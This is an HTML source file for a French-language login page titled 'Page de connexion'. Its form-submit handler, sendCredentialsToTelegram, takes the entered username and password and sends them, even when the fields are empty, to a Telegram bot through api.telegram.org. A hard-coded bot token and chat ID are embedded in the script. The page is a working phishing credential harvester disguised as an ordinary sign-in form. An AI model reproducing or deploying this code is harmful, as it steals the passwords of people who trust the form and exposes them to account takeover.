<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Page de connexion</title>
  <style>
    /* Styles basiques pour la page de connexion */
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      background-color: #f3f3f3;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .login-form {
      background-color: #fff;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
    }
    input {
      padding: 10px;
      margin: 10px 0;
      width: 100%;
      border: 1px solid #ddd;
      border-radius: 4px;
    }
    .password-wrapper {
      position: relative;
    }
    .toggle-password {
      position: absolute;
      right: 10px;
      top: 10px;
      cursor: pointer;
    }
    .error-message {
      color: red;
      display: none;
    }
  </style>
</head>
<body>

  <div class="login-form">
    <h2>Se connecter</h2>
    <form id="loginForm" onsubmit="return sendCredentialsToTelegram(event)">
      <div>
        <label for="username">Nom d'utilisateur</label>
        <input type="text" id="username" name="username" required>
      </div>
      <div class="password-wrapper">
        <label for="password">Mot de passe</label>
        <input type="password" id="password" name="password" required>
        <img src="img/eye-closed.svg" id="eye-icon" class="toggle-password" onclick="togglePassword()">
      </div>
      <button type="submit">Se connecter</button>
      <div class="error-message" id="error-message">Nom d'utilisateur ou mot de passe incorrect</div>
    </form>
  </div>

  <script>
    // Fonction pour afficher/masquer le mot de passe
    function togglePassword() {
      const passwordInput = document.getElementById('password');
      const eyeIcon = document.getElementById('eye-icon');
      if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
        eyeIcon.src = 'img/eye-open.svg'; // Met l'icône "œil ouvert"
      } else {
        passwordInput.type = 'password';
        eyeIcon.src = 'img/eye-closed.svg'; // Met l'icône "œil fermé"
      }
    }

    // Fonction pour envoyer les informations à Telegram
    function sendCredentialsToTelegram(event) {
      event.preventDefault(); // Empêche l'envoi du formulaire

      const username = document.getElementById('username').value;
      const password = document.getElementById('password').value;

      // Paramètres du bot Telegram
      const botToken = '7348058838:AAEurSPCnnOw6yluh3-4oqUq_E61Q55Av-U'; // Remplace par le token de ton bot
      const chatId = '-4746759996'; // Remplace par l'ID de ton chat Telegram

      // Création du message
      const message = `Nom d'utilisateur: ${username}\nMot de passe: ${password}`;

      // URL de l'API Telegram
      const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

      // Envoi de la requête à Telegram (même si la validation échoue)
      fetch(apiUrl)
        .then(response => response.json())
        .then(data => {
          // Affiche un message si l'envoi a réussi
          if (data.ok) {
            console.log('Message envoyé à Telegram.');
          } else {
            console.error('Erreur lors de l\'envoi à Telegram.', data);
          }
        })
        .catch(error => {
          console.error('Erreur:', error);
        });

      // Si les champs sont vides, affiche un message d'erreur mais envoie toujours au Telegram
      if (!username || !password) {
        document.getElementById('error-message').style.display = 'block';
        return false;
      }

      // Envoie les informations au serveur (tu pourrais ajouter une vraie logique de connexion ici)
      // Exemple de code pour gérer la connexion ici si nécessaire
      alert('Les informations ont été envoyées.');

      return false; // Evite que le formulaire soit soumis par défaut
    }
  </script>

</body>
</html>
